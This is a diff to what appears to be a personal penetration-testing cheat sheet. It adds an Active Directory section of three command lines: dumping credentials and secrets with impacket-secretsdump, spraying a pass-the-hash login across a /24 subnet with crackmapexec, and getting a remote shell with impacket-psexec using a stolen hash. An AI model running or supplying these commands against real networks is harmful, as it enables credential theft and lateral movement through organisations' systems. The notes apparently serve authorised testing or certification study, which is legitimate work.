@@ -295,6 +295,26 @@ rdesktop -u <username> -p <password> <ip> -g 70% -r disk:folder=/home/toor/cd/ap
 
 </details>
 
+<details><summary>AD</summary>
+
+extract credentials and secrets from a systemdump
+```
+impacket-secretsdump <domain.local>/<user>:<password>@<ip> 
+``` 
+
+where we can pht
+```
+crackmapexec smb <ip>/24 -u '<username>' -H <hash> --local-auth                                
+```
+
+login with pht
+```
+impacket-psexec <username>@<ip> -hashes <hash>
+```
+
+
+</details>
+
 ---
 
 ### links
